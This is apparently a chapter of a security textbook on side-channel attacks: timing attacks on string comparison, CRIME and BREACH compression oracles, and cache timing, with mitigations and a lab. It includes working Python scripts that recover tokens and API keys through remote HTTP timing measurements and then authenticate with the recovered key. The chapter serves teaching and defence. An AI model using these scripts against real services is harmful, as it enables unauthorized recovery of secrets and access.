# Chapter 6 — Side-Channels: Timing and Compression

> *"We could extract CSRF tokens from HTTPS responses one byte at a time — just by measuring the compressed response size. BREACH proved that TLS encryption doesn't help when compression leaks your secrets."*
> — BREACH attack (2013)

---

## 6.1 What Is a Side Channel?

A side-channel attack extracts secret information not from the algorithm's inputs and outputs, but from **physical or behavioral leakage** during execution.

| Side Channel | Observable | Example Attack |
|---|---|---|
| **Timing** | Execution time | String comparison leaks password length |
| **Compression** | Compressed size | CRIME/BREACH leak cookies from HTTPS |
| **Cache** | Memory access patterns | Flush+Reload extracts AES keys |
| **Power** | Power consumption | DPA extracts keys from smartcards |
| **EM radiation** | Electromagnetic emissions | TEMPEST-style attacks |
| **Error messages** | Different errors for different failures | Padding oracle (Ch. 3) |
| **Sound** | Acoustic emissions | RSA key extraction from CPU noise |

For pentesters, **timing** and **compression** are the most actionable.

---

## 6.2 Timing Attacks

### The Classic: String Comparison

Most programming languages compare strings byte-by-byte and return `False` on the first mismatch.  This creates a measurable timing difference.

```python
"""
timing_oracle.py — Exploit a non-constant-time string comparison
to recover a secret token, one character at a time.
"""
import time
import string
import statistics

SECRET_TOKEN = "a7f3b9c2"  # Target secret

def vulnerable_check(guess: str) -> bool:
    """Vulnerable: byte-by-byte comparison with early exit."""
    if len(guess) != len(SECRET_TOKEN):
        return False
    for a, b in zip(guess, SECRET_TOKEN):
        if a != b:
            return False
        # Small artificial delay to make timing measurable
        # In real systems, this is natural CPU time
        time.sleep(0.001)
    return True

def timing_attack(token_length: int, charset: str = string.hexdigits[:16]):
    """Recover the secret token one character at a time."""
    known = ""
    
    for position in range(token_length):
        best_char = None
        best_time = 0
        
        for candidate in charset:
            guess = known + candidate + "x" * (token_length - len(known) - 1)
            
            # Take multiple measurements to reduce noise
            times = []
            for _ in range(5):
                start = time.perf_counter_ns()
                vulnerable_check(guess)
                elapsed = time.perf_counter_ns() - start
                times.append(elapsed)
            
            median_time = statistics.median(times)
            
            if median_time > best_time:
                best_time = median_time
                best_char = candidate
        
        known += best_char
        print(f"Position {position}: '{best_char}' "
              f"(time: {best_time/1_000_000:.2f}ms) → '{known}'")
    
    return known

print("=== Timing Attack ===\n")
recovered = timing_attack(len(SECRET_TOKEN))
print(f"\nRecovered: '{recovered}'")
print(f"Correct:   '{SECRET_TOKEN}'")
print(f"Match: {recovered == SECRET_TOKEN}")
```

### Remote Timing via HTTP

```python
"""
remote_timing.py — Remote timing attack against a web API.
"""
import requests
import time
import string
import statistics

TARGET_URL = "http://localhost:5000/api/verify"

def measure_response_time(token: str, samples: int = 20) -> float:
    """Measure median response time for a token guess."""
    times = []
    for _ in range(samples):
        start = time.perf_counter_ns()
        requests.get(TARGET_URL, params={"token": token})
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
    return statistics.median(times)

def remote_timing_attack(length: int):
    """Recover token remotely via timing differences."""
    known = ""
    charset = string.hexdigits[:16]
    
    for pos in range(length):
        results = {}
        for c in charset:
            guess = known + c + "0" * (length - len(known) - 1)
            results[c] = measure_response_time(guess)
        
        best = max(results, key=results.get)
        known += best
        
        # Show timing distribution
        sorted_results = sorted(results.items(), key=lambda x: -x[1])
        print(f"[{pos}] Best: '{best}' "
              f"({results[best]/1e6:.2f}ms vs avg "
              f"{statistics.mean(results.values())/1e6:.2f}ms)")
    
    return known
```

### The Fix: Constant-Time Comparison

```python
import hmac
import secrets

def secure_compare(a: str, b: str) -> bool:
    """Constant-time string comparison — immune to timing attacks."""
    return hmac.compare_digest(a.encode(), b.encode())

# Python's hmac.compare_digest uses a constant-time algorithm:
# 1. XORs every byte pair (no early exit)
# 2. ORs the results together
# 3. Returns True only if the final OR result is 0

# ❌ VULNERABLE — timing leaks information
if user_token == secret_token:
    pass

# ✅ SECURE — constant-time
if hmac.compare_digest(user_token, secret_token):
    pass
```

---

## 6.3 Compression Side Channels: CRIME and BREACH

### The Principle

If secret data and attacker-controlled data are **compressed together**, the attacker can infer the secret by observing how much the output shrinks.

```
"secret=abc" + "guess=abc" → compresses well (repeated "abc")
"secret=abc" + "guess=xyz" → compresses poorly (no repetition)

Smaller compressed output → guess matches part of the secret
```

### CRIME (2012): Compressing TLS Records

CRIME attacked TLS-level compression (RFC 3749).  The attacker injects data into TLS requests and observes compressed sizes.

```python
"""
crime_demo.py — Demonstrate compression oracle principle.
"""
import zlib

def compression_oracle(secret: str, guess: str) -> int:
    """
    Simulate CRIME: compress secret + guess together
    and return the compressed length.
    """
    combined = f"Cookie: secret={secret}\r\n" \
               f"Cookie: guess={guess}\r\n"
    return len(zlib.compress(combined.encode()))

SECRET = "a7f3b9c2d1e8"

# When our guess matches a prefix of the secret,
# the compressed size drops
print("=== Compression Oracle Demo ===\n")

best_len = float('inf')
known = ""

for position in range(len(SECRET)):
    results = {}
    for c in "0123456789abcdef":
        candidate = known + c
        compressed_len = compression_oracle(SECRET, candidate)
        results[c] = compressed_len
    
    best_char = min(results, key=results.get)
    known += best_char
    
    # Show the gap between best and second-best
    sorted_r = sorted(results.values())
    gap = sorted_r[1] - sorted_r[0]
    print(f"Position {position}: '{best_char}' "
          f"(compressed: {results[best_char]} bytes, gap: {gap})")

print(f"\nRecovered: '{known}'")
print(f"Actual:    '{SECRET}'")
print(f"Match:     {known == SECRET}")
```

### BREACH (2013): Compressing HTTP Responses

BREACH targets HTTP-level compression (gzip), which is far more common than TLS compression.

```python
"""
breach_demo.py — Simulate BREACH attack to extract CSRF token.

Attack requirements:
1. HTTP compression enabled (Content-Encoding: gzip)
2. Secret (CSRF token) reflected in response body
3. Attacker can inject content into the response (e.g., via URL parameter)
4. Attacker can observe response sizes (network-level)
"""
import gzip

# Simulated server response with CSRF token
CSRF_TOKEN = "x8Kp2mNq9vLw"

def generate_response(user_input: str) -> bytes:
    """Simulate an HTTP response that reflects user input."""
    body = f"""
    <html>
    <head><meta name="csrf-token" content="{CSRF_TOKEN}"></head>
    <body>
        <p>Search results for: {user_input}</p>
        <form>
            <input type="hidden" name="csrf" value="{CSRF_TOKEN}">
        </form>
    </body>
    </html>
    """
    return gzip.compress(body.encode())

def breach_attack():
    """Extract CSRF token via compression oracle."""
    charset = "abcdefghijklmnopqrstuvwxyz" \
              "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    known = ""
    
    print("=== BREACH Attack Simulation ===\n")
    
    for position in range(len(CSRF_TOKEN)):
        results = {}
        for c in charset:
            candidate = f'csrf-token" content="{known}{c}'
            response = generate_response(candidate)
            results[c] = len(response)
        
        best = min(results, key=results.get)
        known += best
        
        sorted_lens = sorted(set(results.values()))
        print(f"[{position:2d}] '{best}' → "
              f"size={results[best]} "
              f"(min={sorted_lens[0]}, next={sorted_lens[1] if len(sorted_lens)>1 else 'N/A'})")
    
    return known

recovered = breach_attack()
print(f"\nRecovered: '{recovered}'")
print(f"Actual:    '{CSRF_TOKEN}'")
```

### BREACH Mitigations

```python
"""
Mitigations against BREACH:
"""

# 1. Disable HTTP compression for sensitive pages
# Nginx: gzip off; (for pages with secrets)
# Apache: SetEnvIfNoCase Request_URI \.(?:html|json)$ no-gzip

# 2. Randomize the CSRF token on every response
import secrets
def get_csrf_token():
    # Generate a new random token per request
    return secrets.token_urlsafe(32)

# 3. SameSite cookies (prevents cross-origin requests)
# Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly

# 4. Place secrets outside the compressed body
# Use response headers instead of HTML for tokens
```

---

## 6.4 Cache-Timing Attacks (Brief)

Cache-timing attacks exploit CPU cache behavior — if data is in cache, it's accessed faster than main memory.

### Flush+Reload (Conceptual)

```python
"""
flush_reload_concept.py — Conceptual demonstration.
In reality, this requires assembly-level cache manipulation.

The attack:
1. Flush a specific line of the AES T-table from cache
2. Let the victim perform an AES encryption
3. Reload that cache line and measure access time
4. Fast access = victim used that table entry = information about the key

After enough observations, the full AES key can be recovered.
"""

# This is not executable in pure Python — it requires:
# - Shared memory between attacker and victim (e.g., same host)
# - rdtsc or similar high-resolution timer
# - Assembly instructions: CLFLUSH, memory barriers

# Tools for cache-timing attacks:
# - Mastik: https://cs.adelaide.edu.au/~yval/Mastik/
# - CacheOut: https://cacheoutattack.com/

# Practical impact:
# - Cloud VMs on shared hardware
# - SGX enclaves (Foreshadow / L1 Terminal Fault)
# - Browser-based via JavaScript SharedArrayBuffer
#   (mitigated by Site Isolation and reduced timer resolution)

print("""
Cache-Timing Attack Flow:
1. Attacker shares physical CPU with victim
2. CLFLUSH: evict target memory from cache
3. Victim process runs crypto operation
4. RELOAD: measure access time to target memory
5. Fast = cache hit = victim accessed that address
6. Repeat to build access pattern → recover key
""")
```

---

## 6.5 Detecting Timing Vulnerabilities

```python
"""
timing_detector.py — Automated timing vulnerability scanner.
Tests if an endpoint has timing-dependent behavior.
"""
import requests
import statistics
import time

def detect_timing_leak(url: str, param_name: str,
                        known_prefix: str = "",
                        charset: str = "abcdef0123456789",
                        samples: int = 50) -> dict:
    """
    Test if an endpoint leaks timing information.
    Returns timing statistics per character.
    """
    results = {}
    
    for char in charset:
        guess = known_prefix + char
        times = []
        
        for _ in range(samples):
            start = time.perf_counter_ns()
            requests.get(url, params={param_name: guess}, timeout=5)
            elapsed = time.perf_counter_ns() - start
            times.append(elapsed)
        
        results[char] = {
            "median": statistics.median(times),
            "mean": statistics.mean(times),
            "stdev": statistics.stdev(times),
        }
    
    # Statistical analysis
    medians = [r["median"] for r in results.values()]
    overall_mean = statistics.mean(medians)
    overall_stdev = statistics.stdev(medians) if len(medians) > 1 else 0
    
    # Find outliers (> 2 standard deviations)
    outliers = {
        char: data for char, data in results.items()
        if abs(data["median"] - overall_mean) > 2 * overall_stdev
    }
    
    return {
        "timing_leak_detected": len(outliers) > 0,
        "outliers": outliers,
        "overall_mean_ns": overall_mean,
        "overall_stdev_ns": overall_stdev,
    }

# Usage:
# result = detect_timing_leak(
#     "http://target.com/api/verify",
#     "token",
#     known_prefix="a7"
# )
# print(f"Timing leak: {result['timing_leak_detected']}")
```

---

## 6.6 Defensive Takeaways

| Attack | Mitigation |
|---|---|
| Timing (string comparison) | `hmac.compare_digest()` or equivalent constant-time compare |
| Timing (modular exponentiation) | Constant-time math libraries (Montgomery multiplication) |
| CRIME | Disable TLS-level compression (already default in modern TLS) |
| BREACH | Disable HTTP compression for pages with secrets; randomize tokens; SameSite cookies |
| Cache timing | Process isolation; constant-time AES-NI; avoid table-based crypto |
| Power/EM | Masking countermeasures in hardware; noise injection |

---

## 6.7 Lab: Build a Timing Oracle

```python
"""
lab_timing_oracle.py

CHALLENGE: A web server at http://localhost:8080/login
compares API keys byte-by-byte with early exit.
The API key is 16 hex characters.

Your task:
1. Measure response times for each character position
2. Identify the character that produces the longest response
3. Build up the full API key character by character
4. Verify by making an authenticated request

Starter code:
"""
import requests
import time
import statistics

def measure(url, api_key, n=30):
    times = []
    for _ in range(n):
        start = time.perf_counter_ns()
        requests.get(url, headers={"X-API-Key": api_key})
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
    return statistics.median(times)

def solve():
    url = "http://localhost:8080/login"
    charset = "0123456789abcdef"
    known = ""
    
    for pos in range(16):
        best_char, best_time = None, 0
        for c in charset:
            guess = known + c + "0" * (15 - pos)
            t = measure(url, guess)
            if t > best_time:
                best_time = t
                best_char = c
        known += best_char
        print(f"[{pos:2d}] {known}")
    
    # Verify
    r = requests.get(url, headers={"X-API-Key": known})
    print(f"\nKey: {known}")
    print(f"Status: {r.status_code}")

# solve()
```

---

## 6.8 Key Takeaways

- **Timing attacks** are the most practical side-channel for web applications.  Any byte-by-byte comparison leaks information.
- **`hmac.compare_digest()`** is the fix for timing attacks on string comparisons.  Use it everywhere you compare secrets.
- **BREACH** is still relevant — any page that reflects user input AND contains secrets AND is gzip-compressed is vulnerable.
- **Cache-timing attacks** are a concern for cloud/shared hosting environments.  Use AES-NI (hardware AES) to avoid table lookups.
- **Defense is about constant-time operations** — every path through your code should take the same time, regardless of the input.

---

**Next:** [Chapter 7 — Asymmetric Crypto: Primes & Curves →](07_asymmetric.md)
